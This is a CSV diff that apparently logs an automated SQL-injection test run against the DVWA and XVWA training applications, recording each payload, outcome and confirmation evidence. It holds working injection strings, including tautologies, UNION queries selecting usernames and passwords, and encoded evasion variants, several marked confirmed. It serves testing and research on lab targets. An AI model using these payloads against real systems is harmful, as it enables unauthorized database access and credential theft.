@@ -1,0 +1,813 @@
+﻿RunId,Site,Category,Mode,Index,Payload,Status,Outcome,Confirmed,EvidenceCode,LocationHost,ElapsedMs,Error,TestedUtc
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Basic,1,%27%20OR%20%27a%27=%27a,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:6;baseline:2,,297,,2026-10-19T02:48:56.124689+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Basic,2,' AND 1=1--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,78,,2026-10-19T02:48:55.898344+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Basic,3,%27%20or%20%271%27=%271,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:6;baseline:2,,79,,2026-10-19T02:48:55.916900+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Basic,4,'/**/UNION/**/SELECT/**/NULL--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,94,,2026-10-19T02:48:55.933371+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Basic,5,%2527%2520AND%25201=1--,200,NO_CONFIRMATION_SIGNAL,false,,,79,,2026-10-19T02:48:55.922140+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Basic,6,' OR '1'='1,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:6;baseline:2,,78,,2026-10-19T02:48:55.928206+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Basic,7,'/**/OR/**/EXISTS(SELECT/**/1)--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,78,,2026-10-19T02:48:55.938284+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Basic,8,'/**/OR/**/1=1--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,94,,2026-10-19T02:48:55.946300+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Basic,9,%27%20UNION%20SELECT%20NULL--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,78,,2026-10-19T02:48:55.986523+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Basic,10,' OR EXISTS(SELECT 1)--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,78,,2026-10-19T02:48:55.994010+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Basic,11,' OR 1=1--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,93,,2026-10-19T02:48:56.007274+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Basic,12,'/**/AND/**/1=1--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,78,,2026-10-19T02:48:56.013171+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Basic,13,' OR ''=',200,SQL_RESULT_DIFFERENTIAL,true,result_rows:6;baseline:2,,78,,2026-10-19T02:48:56.018047+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Basic,14,'/**/or/**/''=',200,SQL_RESULT_DIFFERENTIAL,true,result_rows:6;baseline:2,,94,,2026-10-19T02:48:56.022735+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Basic,15,'/**/OR/**/'x'='x'--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,78,,2026-10-19T02:48:56.030618+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Basic,16,' or '1'='1,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:6;baseline:2,,78,,2026-10-19T02:48:56.053335+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Basic,17,' OR 1=1#,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:6;baseline:2,,62,,2026-10-19T02:48:56.063038+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Basic,18,"' UNION SELECT username,password FROM users--",200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,63,,2026-10-19T02:48:56.071293+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Basic,19,"'/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--",200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,63,,2026-10-19T02:48:56.076256+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Basic,20,"' union SELECT username,password FROM users--",200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,63,,2026-10-19T02:48:56.078708+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Basic,21,' OR 'x'='x'--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,62,,2026-10-19T02:48:56.085262+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Basic,22,%27/**/OR/**/1=1--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,62,,2026-10-19T02:48:56.092474+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Basic,23,' UNION SELECT NULL--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,47,,2026-10-19T02:48:56.103254+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Basic,24,' OR 'a'='a,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:6;baseline:2,,47,,2026-10-19T02:48:56.107030+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Basic,25,%27%20OR%20%271%27=%271,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:6;baseline:2,,31,,2026-10-19T02:48:56.113437+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Basic,26,%27%20OR%20%27%27=%27,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:6;baseline:2,,62,,2026-10-19T02:48:56.135870+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Basic,27,%27%20AND%201=1--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,78,,2026-10-19T02:48:56.156777+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Advanced,1,'/**/OR/**/''=',200,SQL_RESULT_DIFFERENTIAL,true,result_rows:6;baseline:2,,79,,2026-10-19T02:48:56.164566+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Advanced,2,'/**/or/**/EXISTS(SELECT/**/1)--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,79,,2026-10-19T02:48:56.171143+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Advanced,3,%27%20OR%201=1--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,78,,2026-10-19T02:48:56.179000+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Advanced,4,'/**/OR/**/'a'='a,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:6;baseline:2,,78,,2026-10-19T02:48:56.183882+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Advanced,5,'/**/OR/**/1=1#,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:6;baseline:2,,78,,2026-10-19T02:48:56.188396+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Advanced,6,'/**/OR/**/'1'='1,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:6;baseline:2,,78,,2026-10-19T02:48:56.193161+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Advanced,7,%27/**/or/**/%27x%27=%27x%27--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,63,,2026-10-19T02:48:56.198991+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Advanced,8,"'/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--",200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,62,,2026-10-19T02:48:56.213481+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Advanced,9,'/**/OR/**/1=1--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,46,,2026-10-19T02:48:56.219745+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Advanced,10,'/**/OR/**/EXISTS(SELECT/**/1)--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,46,,2026-10-19T02:48:56.219745+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Advanced,11,'/**/AND/**/1=1--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,31,,2026-10-19T02:48:56.219745+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Advanced,12,'/**/or/**/'1'='1,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:6;baseline:2,,31,,2026-10-19T02:48:56.220275+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Advanced,13,'/**/or/**/1=1--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,31,,2026-10-19T02:48:56.220800+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Advanced,14,'/**/union/**/SELECT/**/NULL--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,47,,2026-10-19T02:48:56.258371+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Advanced,15,%27%20OR%20EXISTS(SELECT%201)--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,94,,2026-10-19T02:48:56.322440+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Advanced,16,'/**/OR/**/'x'='x'--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,31,,2026-10-19T02:48:56.269799+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Advanced,17,'/**/UNION/**/SELECT/**/NULL--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,78,,2026-10-19T02:48:56.314537+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Advanced,18,%27%20UNION%20SELECT%20NULL--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,94,,2026-10-19T02:48:56.327409+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Evasion,1,%27%20OR%20%27a%27=%27a,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:6;baseline:2,,93,,2026-10-19T02:48:56.335094+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Evasion,2,%27%20AND%201=1--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,47,,2026-10-19T02:48:56.293989+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Evasion,3,%27%20or%20EXISTS(SELECT%201)--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,62,,2026-10-19T02:48:56.306106+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Evasion,4,%27%20OR%201=1--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,78,,2026-10-19T02:48:56.339546+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Evasion,5,%27%20OR%20%271%27=%271,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:6;baseline:2,,78,,2026-10-19T02:48:56.347783+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Evasion,6,"%27%20UNION%20SELECT%20username,password%20FROM%20users--",200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,62,,2026-10-19T02:48:56.359287+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Evasion,7,%2527%2520OR%2520%2527x%2527=%2527x%2527--,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:48:56.368350+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Evasion,8,%27%20OR%201=1#,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:6;baseline:2,,63,,2026-10-19T02:48:56.376261+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Evasion,9,%27%20UNION%20SELECT%20NULL--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,62,,2026-10-19T02:48:56.385733+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Evasion,10,%2527/**/AND/**/1=1--,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:48:56.389363+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Evasion,11,"%27%20union%20SELECT%20username,password%20FROM%20users--",200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,63,,2026-10-19T02:48:56.397955+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Evasion,12,%2527%2520or%25201=1#,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:48:56.402685+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Evasion,13,%27%20OR%20%27x%27=%27x%27--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,63,,2026-10-19T02:48:56.410646+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Evasion,14,"%27/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--",200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,63,,2026-10-19T02:48:56.421566+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Evasion,15,%27%20OR%20%27%27=%27,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:6;baseline:2,,62,,2026-10-19T02:48:56.433922+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Evasion,16,%2527%2520UNION%2520SELECT%2520NULL--,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:48:56.441823+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Evasion,17,%27/**/OR/**/%27x%27=%27x%27--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,63,,2026-10-19T02:48:56.449967+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Evasion,18,%27/**/or/**/1=1#,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:6;baseline:2,,63,,2026-10-19T02:48:56.454619+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Evasion,19,%252527/**/OR/**/%252527x%252527=%252527x%252527--,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:48:56.463516+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Evasion,20,%2527/**/OR/**/%2527a%2527=%2527a,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:48:56.463516+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Evasion,21,%27/**/AND/**/1=1--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,78,,2026-10-19T02:48:56.476438+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Evasion,22,%27%20OR%20EXISTS(SELECT%201)--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,62,,2026-10-19T02:48:56.488241+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Evasion,23,%27%20union%20SELECT%20NULL--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,63,,2026-10-19T02:48:56.496098+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,SQL Injection,Evasion,24,%2527%2520or%2520%2527x%2527=%2527x%2527--,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:48:56.500900+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Basic,1,%27%20OR%20%27a%27=%27a,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:10;baseline:0,,172,,2026-10-19T02:48:56.624717+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Basic,2,' AND 1=1--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,328,,2026-10-19T02:48:56.777559+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Basic,3,%27%20or%20%271%27=%271,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:10;baseline:0,,47,,2026-10-19T02:48:56.517585+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Basic,4,'/**/UNION/**/SELECT/**/NULL--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,329,,2026-10-19T02:48:56.789116+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Basic,5,%2527%2520AND%25201=1--,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:48:56.534552+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Basic,6,' OR '1'='1,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:10;baseline:0,,63,,2026-10-19T02:48:56.545326+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Basic,7,'/**/OR/**/EXISTS(SELECT/**/1)--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,62,,2026-10-19T02:48:56.552095+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Basic,8,'/**/OR/**/1=1--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,328,,2026-10-19T02:48:56.824053+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Basic,9,%27%20UNION%20SELECT%20NULL--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,47,,2026-10-19T02:48:56.563105+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Basic,10,' OR EXISTS(SELECT 1)--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,31,,2026-10-19T02:48:56.564176+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Basic,11,' OR 1=1--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,31,,2026-10-19T02:48:56.573504+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Basic,12,'/**/AND/**/1=1--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,31,,2026-10-19T02:48:56.860187+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Basic,13,' OR ''=',200,SQL_RESULT_DIFFERENTIAL,true,result_rows:10;baseline:0,,62,,2026-10-19T02:48:56.881170+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Basic,14,'/**/or/**/''=',200,SQL_RESULT_DIFFERENTIAL,true,result_rows:10;baseline:0,,47,,2026-10-19T02:48:56.874991+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Basic,15,'/**/OR/**/'x'='x'--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,63,,2026-10-19T02:48:56.897010+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Basic,16,' or '1'='1,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:10;baseline:0,,63,,2026-10-19T02:48:56.897010+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Basic,17,' OR 1=1#,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:10;baseline:0,,344,,2026-10-19T02:48:57.181559+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Basic,18,"' UNION SELECT username,password FROM users--",200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,344,,2026-10-19T02:48:57.176547+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Basic,19,"'/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--",200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,328,,2026-10-19T02:48:57.180561+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Basic,20,"' union SELECT username,password FROM users--",200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,47,,2026-10-19T02:48:56.906950+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Basic,21,' OR 'x'='x'--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,47,,2026-10-19T02:48:56.917099+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Basic,22,%27/**/OR/**/1=1--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,47,,2026-10-19T02:48:56.928244+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Basic,23,' UNION SELECT NULL--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,31,,2026-10-19T02:48:56.936113+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Basic,24,' OR 'a'='a,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:10;baseline:0,,31,,2026-10-19T02:48:56.940252+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Basic,25,%27%20OR%20%271%27=%271,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:10;baseline:0,,47,,2026-10-19T02:48:56.947918+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Basic,26,%27%20OR%20%27%27=%27,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:10;baseline:0,,46,,2026-10-19T02:48:56.963547+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Basic,27,%27%20AND%201=1--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,31,,2026-10-19T02:48:56.966141+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Advanced,1,'/**/OR/**/''=',200,SQL_RESULT_DIFFERENTIAL,true,result_rows:10;baseline:0,,47,,2026-10-19T02:48:56.974769+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Advanced,2,'/**/or/**/EXISTS(SELECT/**/1)--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,63,,2026-10-19T02:48:56.992353+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Advanced,3,%27%20OR%201=1--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,47,,2026-10-19T02:48:56.995295+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Advanced,4,'/**/OR/**/'a'='a,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:10;baseline:0,,32,,2026-10-19T02:48:57.002905+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Advanced,5,'/**/OR/**/1=1#,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:10;baseline:0,,47,,2026-10-19T02:48:57.008871+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Advanced,6,'/**/OR/**/'1'='1,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:10;baseline:0,,47,,2026-10-19T02:48:57.027357+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Advanced,7,%27/**/or/**/%27x%27=%27x%27--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,31,,2026-10-19T02:48:57.029591+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Advanced,8,"'/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--",200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,31,,2026-10-19T02:48:57.033443+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Advanced,9,'/**/OR/**/1=1--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,47,,2026-10-19T02:48:57.046556+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Advanced,10,'/**/OR/**/EXISTS(SELECT/**/1)--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,47,,2026-10-19T02:48:57.058452+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Advanced,11,'/**/AND/**/1=1--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,31,,2026-10-19T02:48:57.066048+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Advanced,12,'/**/or/**/'1'='1,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:10;baseline:0,,47,,2026-10-19T02:48:57.072289+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Advanced,13,'/**/or/**/1=1--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,47,,2026-10-19T02:48:57.079694+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Advanced,14,'/**/union/**/SELECT/**/NULL--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,46,,2026-10-19T02:48:57.097133+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Advanced,15,%27%20OR%20EXISTS(SELECT%201)--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,47,,2026-10-19T02:48:57.106642+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Advanced,16,'/**/OR/**/'x'='x'--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,47,,2026-10-19T02:48:57.102074+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Advanced,17,'/**/UNION/**/SELECT/**/NULL--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,47,,2026-10-19T02:48:57.126020+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Advanced,18,%27%20UNION%20SELECT%20NULL--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,62,,2026-10-19T02:48:57.130540+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Evasion,1,%27%20OR%20%27a%27=%27a,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:10;baseline:0,,47,,2026-10-19T02:48:57.137492+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Evasion,2,%27%20AND%201=1--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,31,,2026-10-19T02:48:57.142884+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Evasion,3,%27%20or%20EXISTS(SELECT%201)--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,47,,2026-10-19T02:48:57.153799+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Evasion,4,%27%20OR%201=1--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,31,,2026-10-19T02:48:57.153799+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Evasion,5,%27%20OR%20%271%27=%271,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:10;baseline:0,,16,,2026-10-19T02:48:57.153799+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Evasion,6,"%27%20UNION%20SELECT%20username,password%20FROM%20users--",200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,32,,2026-10-19T02:48:57.160739+00:00
